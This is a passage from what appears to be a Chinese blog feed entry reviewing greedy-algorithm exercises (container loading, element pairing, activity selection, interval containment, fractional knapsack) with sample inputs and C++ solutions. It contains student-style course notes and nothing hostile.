class="line">有一批集装箱要装上一艘载重量为C的轮船。其中集装箱i的重量为wi。最优装载问题要求确定在装载体积不受限制的情况下，将尽可能多的集装箱装上轮船。</span><br><span class="line"></span><br><span class="line">Input</span><br><span class="line"></span><br><span class="line">输入的第一个为测试样例的个数T（ T &lt;= 100 ），接下来有T个测试样例。每个测试样例的第一行是一个整数n（ n &lt;= 1000 ）和一个非负数C（ C &lt;= 10000 ），分别表示集装箱的个数以及轮船的载重量。接下来有n行，每行一个非负数，表示每个集装箱的重量。</span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line"></span><br><span class="line">输出最多装集装箱的个数和最终的承重量。</span><br><span class="line"></span><br><span class="line">Sample Input</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">5 100</span><br><span class="line">20</span><br><span class="line">50</span><br><span class="line">120</span><br><span class="line">99</span><br><span class="line">30</span><br></pre></td></tr></table></figure><p><strong>思路</strong><br>贪心选择策略：重量最轻者优先装载<br>将装船过程划为多步选择，每步装一个货箱，每次从剩下的货箱中选择重量最轻的货箱。如此下去直到所有货箱均装上船或船上不能再容纳其他任何一个货箱。</p><p><strong>code</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;algorithm&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int w[100];</span><br><span class="line">int c;</span><br><span class="line">int n;</span><br><span class="line">int load(int k,int z)</span><br><span class="line">&#123;</span><br><span class="line">int count=0;</span><br><span class="line">sort(w,w+k);</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;k;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(z&gt;=w[i])</span><br><span class="line">&#123;</span><br><span class="line">count+=w[i];</span><br><span class="line">z-=w[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int t;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;n&gt;&gt;c;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;w[i];</span><br><span class="line">&#125;</span><br><span class="line">int ans=load(n,c);</span><br><span class="line">cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-配对元素"><a href="#3-配对元素" class="headerlink" title="3.配对元素"></a><strong>3.配对元素</strong></h2><p><strong>题目描述</strong><br>给出2个序列A={a[1]，a[2]，…，a[n]}，B={b[1]，b[2]，…，b[n]},从A、B中各选出n个元素进行一一配对（可以不按照原来在序列中的顺序）    ，并使得所有配对元素差的绝对值之和最大。 </p><p><strong>输入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入的第1行为1个整数n 第2行包含n个整数，题目中的A序列。  第3行包含n个整数，题目中的B序列。</span><br><span class="line">4</span><br><span class="line">2 5 6 3</span><br><span class="line">1 4 6 7</span><br></pre></td></tr></table></figure><p><strong>输出</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 一个数，最大配对</span><br><span class="line">3与6配对，2与7配对，5与4配对，6与1配对，绝对值之差和为14 对于10%的数据，有n≤20；  对于30%的数据，有n≤100；  对于50%的数据，有n≤1000；  对于100%的数据，有n≤10000；a[i]，b[i]≤1000</span><br><span class="line">14</span><br></pre></td></tr></table></figure><p><strong>思路</strong><br>要使相减的绝对值之和最大，也就是要尽量使得两个数的差要大一点，贪心策略自然就是用a序列最大值减去b序列最小值。</p><p><strong>code</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;cmath&gt;</span></span><br><span class="line"><span class="comment">#include&lt;algorithm&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int n;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line">int a[100];</span><br><span class="line">int b[100];</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;b[i];</span><br><span class="line">&#125;</span><br><span class="line">sort(a,a+n);</span><br><span class="line">sort(b,b+n);</span><br><span class="line">int j=0,sum=0;</span><br><span class="line"><span class="keyword">for</span>(int i=n-1;i&gt;=0;i--)</span><br><span class="line">&#123;</span><br><span class="line">sum+=fabs(a[i]-b[j]);</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;sum&lt;&lt;endl;</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="4-活动安排"><a href="#4-活动安排" class="headerlink" title="4.活动安排"></a><strong>4.活动安排</strong></h2><p><strong>题目描述</strong><br>给出n个活动的开始和结束时间，要求找出所有活动集合中不冲突的最大活动数</p><p><strong>思路</strong><br>结构体，按结束时间从小到大排序这就是贪心策略：越早结束约优先考虑，第一个默认加入，其后进行判断到底是否可以加入集合，如可以就计数</p><p><strong>code</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;algorithm&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">typedef struct node</span><br><span class="line">&#123;</span><br><span class="line">int begin;</span><br><span class="line">int end;</span><br><span class="line">&#125;node;</span><br><span class="line">bool cmp(node a,node b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">return</span> a.end&lt;b.end;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int n;</span><br><span class="line"><span class="keyword">while</span>(cin&gt;&gt;n)</span><br><span class="line">&#123;</span><br><span class="line">node work[100000];</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;work[i].begin&gt;&gt;work[i].end;</span><br><span class="line">&#125;</span><br><span class="line">sort(work,work+n,cmp);</span><br><span class="line">int count=1;</span><br><span class="line">int temp=work[0].end;</span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(work[i].begin&gt;=temp)</span><br><span class="line">&#123;</span><br><span class="line">count++;</span><br><span class="line">temp=work[i].end;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;count&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-区间包含"><a href="#5-区间包含" class="headerlink" title="5.区间包含"></a><strong>5.区间包含</strong></h2><p><strong>题目描述</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">已知 n 个左闭右开区间 [a,b)，对其进行 m 次询问，求区间[l,r]最多可以包含 n 个区间中的多少个区间，并且被包含的所有区间都不相交。</span><br><span class="line">输入</span><br><span class="line"></span><br><span class="line">输入包含多组测试数据，对于每组测试数据：</span><br><span class="line">第一行包含两个整数 n ,m (1≤n≤100000,1≤m≤100) </span><br><span class="line">接下来 n 行每行包含两个整数 a ,b (0≤a&lt;b≤10^9) </span><br><span class="line">接下来 m 行每行包含两个整数 l ,r (0≤l&lt;r≤10^9) </span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">对于每组测试数据，输出 m 行，每行包含一个整数</span><br><span class="line"></span><br><span class="line">样例输入</span><br><span class="line">4 3</span><br><span class="line">1 3</span><br><span class="line">2 4</span><br><span class="line">1 4</span><br><span class="line">1 2</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br><span class="line"></span><br><span class="line">样例输出</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p><strong>思路</strong><br>和活动安排问题大致相同</p><p><strong>code</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;algorithm&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">typedef struct node</span><br><span class="line">&#123;</span><br><span class="line">int left;</span><br><span class="line">int right;</span><br><span class="line">&#125;node; </span><br><span class="line">bool cmp(node a,node b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">return</span>  a.right&lt;b.right;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">int n,m;</span><br><span class="line"><span class="keyword">while</span>(cin&gt;&gt;n&gt;&gt;m)</span><br><span class="line">&#123;</span><br><span class="line">node nnum[100005],mnum[105];</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;nnum[i].left&gt;&gt;nnum[i].right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;m;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;mnum[i].left&gt;&gt;mnum[i].right;</span><br><span class="line">&#125;</span><br><span class="line">sort(nnum,nnum+n,cmp);</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;m;i++)</span><br><span class="line">&#123;</span><br><span class="line">int count=0;</span><br><span class="line">int t=mnum[i].left;</span><br><span class="line"><span class="keyword">for</span>(int j=0;j&lt;n;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(nnum[j].left&gt;=t)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(nnum[j].right&lt;=mnum[i].right)</span><br><span class="line">&#123;</span><br><span class="line">count++;</span><br><span class="line">t=nnum[j].right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;count&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-homework"><a href="#6-homework" class="headerlink" title="6.homework"></a><strong>6.homework</strong></h2><p><strong>题目描述</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> 临近开学了，大家都忙着收拾行李准  备返校，但 I_Love_C 却不为此担心! 因为他的心思全在暑假作业上：目前为止还未开动。</span><br><span class="line"></span><br><span class="line">暑假作业是很多张试卷，我们这些从试卷里爬出来的人都知道，卷子上的题目有选择题、填空题、简答题、证明题等。而做选择题的好处就在于工作量很少，但又因为选择题题目都普遍很长。如果有 5 张试卷，其中 4 张是选择题，最后一张是填空题，很明显做最后一张所花的时间要比前 4 张长很多。但如果你只做了选择题，虽然工作量很少，但表面上看起来也已经做了4/5的作业了。</span><br><span class="line"></span><br><span class="line">I_Love_C决定就用这样的方法来蒙混过关，他统计出了做完每一张试卷所需的时间以及它做完后能得到的价值（按上面的原理，选择题越多价值当然就越高咯）。</span><br><span class="line"></span><br><span class="line">现在就请你帮他安排一下，用他仅剩的一点时间来做最有价值的作业。</span><br><span class="line">输入</span><br><span class="line"></span><br><span class="line">测试数据包括多组。每组测试数据以两个整数 M,N(1&lt;M&lt;20,1&lt;N&lt;10000) 开头，分别表示试卷的数目和 I_Love_C 剩下的时间。接下来有 M 行，每行包括两个整数 T,V(1&lt;T&lt;N,1&lt;V&lt;10000)分别表示做完这张试卷所需的时间以及做完后能得到的价值，输入以 0 0 结束。</span><br><span class="line">输出</span><br><span class="line"></span><br><span class="line">对应每组测试数据输出 I_Love_C 能获得的最大价值。保留小数点 2 位</span><br><span class="line"></span><br><span class="line">提示：float 的精度可能不够，你应该使用 double 类型。</span><br><span class="line">样例输入</span><br><span class="line"></span><br><span class="line">4 20</span><br><span class="line">4 10</span><br><span class="line">5 22</span><br><span class="line">10 3</span><br><span class="line">1 2</span><br><span class="line">0 0</span><br><span class="line"></span><br><span class="line">样例输出</span><br><span class="line"></span><br><span class="line">37.00</span><br></pre></td></tr></table></figure><p><strong>思路</strong><br>该题为贪心法解决背包问题，物体可以被拆分，先按照平均价值排序即可</p><p><strong>code</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">double</span> time;</span><br><span class="line"><span class="keyword">double</span> value;</span><br><span class="line"><span class="keyword">double</span> avg;</span><br><span class="line">&#125;node;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(node a,node b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.avg&gt;b.avg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> m,n;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;m&gt;&gt;n&amp;&amp;(m!=<span class="number">0</span>&amp;&amp;n!=<span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">node paper[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;paper[i].time&gt;&gt;paper[i].value;</span><br><span class="line">paper[i].avg=paper[i].value/paper[i].time;</span><br><span class="line">&#125;</span><br><span class="line">sort(paper,paper+m,cmp);</span><br><span class="line"><span class="keyword">double</span> temp=(<span class="keyword">double</span>)n;</span><br><span class="line"><span class="keyword">double</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(temp&gt;=paper[i].time)</span><br><span class="line">&#123;</span><br><span class="line">sum+=paper[i].value;</span><br><span class="line">temp-=paper[i].time;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">sum+=paper[i].avg*temp;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="number">2</span>)&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h1&gt;&lt;p&gt;对算法导论课的知识进行总结和考前复习~
    
    </summary>
    
      <category term="算法" scheme="https://gardenia30.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="Algorithm" scheme="https://gardenia30.top/tags/Algorithm/"/>
    
  </entry>
  
</feed>
